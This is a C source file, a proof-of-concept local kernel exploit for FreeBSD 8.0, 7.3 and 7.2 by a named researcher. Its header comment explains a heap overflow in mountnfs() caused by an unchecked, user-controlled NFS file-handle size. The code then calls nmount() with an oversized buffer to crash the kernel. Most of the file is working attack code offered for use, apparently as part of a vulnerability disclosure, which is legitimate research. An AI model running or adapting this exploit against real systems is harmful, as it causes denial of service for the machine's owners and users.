/*
 * mountnfsex.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Local kernel exploit for FreeBSD 8.0, 7.3 and 7.2.
 *
 * Discovered and exploited by Patroklos (argp) Argyroudis.
 *
 * The vulnerability is in mountnfs() which is reachable by the mount(2)
 * and nmount(2) system calls.  In order for them to be enabled for
 * unprivileged users the sysctl(8) variable vfs.usermount must be set to
 * a non-zero value.
 *
 * mountnfs() employs an insufficient input validation method for copying
 * data passed in the struct nfs_args from userspace to kernel.
 * Specifically, the file handle to be mounted (nfs_args.fh) and its size
 * (nfs_args.fhsize) are completely user-controllable.  In file
 * sys/nfsclient/nfs_vfsops.c from 8.0-RELEASE:
 *
 * 1219     bcopy((caddr_t)argp->fh, (caddr_t)nmp->nm_fh, argp->fhsize);
 *
 * The above can cause a kernel heap overflow when argp->fh is bigger than
 * 128 bytes (the size of nmp->nm_fh) since nmp is an allocated item on
 * the UMA zone nfsmount_zone (again from sys/nfsclient/nfs_vfsops.c):
 *
 * 1164     struct nfsmount *nmp;
 *          ...
 * 1175         nmp = uma_zalloc(nfsmount_zone, M_WAITOK);
 *
 * The result is a kernel crash/denial-of-service.  I have developed a code
 * execution/privilege escalation exploit, but I will not release it at this
 * point.  7.1-RELEASE and earlier do not seem to be vulnerable since the
 * bug was introduced in 7.2-RELEASE.
 *
 * $Id: mountnfsex.c,v c1302ea1317d 2010/05/23 17:30:17 argp $
 */

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/uio.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#define BUFSIZE     1024

#define FSNAME      "nfs"
#define DIRPATH     "/tmp/nfs"

int
main()
{
    struct iovec iov[8];

    mkdir(DIRPATH, 0700);

    iov[0].iov_base = "fstype";
    iov[0].iov_len = strlen(iov[0].iov_base) + 1;
    
    iov[1].iov_base = FSNAME;
    iov[1].iov_len = strlen(iov[1].iov_base) + 1;
    
    iov[2].iov_base = "fspath";
    iov[2].iov_len = strlen(iov[2].iov_base) + 1;
    
    iov[3].iov_base = DIRPATH;
    iov[3].iov_len = strlen(iov[3].iov_base) + 1;

    iov[4].iov_base = "fh";
    iov[4].iov_len = strlen(iov[4].iov_base) + 1;

    iov[5].iov_base = calloc(BUFSIZE, sizeof(char));

    if(iov[5].iov_base == NULL)
    {
        perror("calloc");
        rmdir(DIRPATH);
        exit(EXIT_FAILURE);
    }

    memset(iov[5].iov_base, 0x41, (BUFSIZE - 1));
    iov[5].iov_len = BUFSIZE;

    iov[6].iov_base = "hostname";
    iov[6].iov_len = strlen(iov[6].iov_base) + 1;

    iov[7].iov_base = "census-labs.com";
    iov[7].iov_len = strlen(iov[7].iov_base) + 1;

    printf("[*] calling nmount()\n");

    if(nmount(iov, 8, 0) < 0)
    {
        fprintf(stderr, "[!] nmount error: %d\n", errno);
        perror("nmount");
        rmdir(DIRPATH);
        free(iov[5].iov_base);
        exit(1);
    }

    printf("[*] unmounting and deleting %s\n", DIRPATH);

    unmount(DIRPATH, 0);
    rmdir(DIRPATH);
    free(iov[5].iov_base);

    return 0;
}

/* EOF */
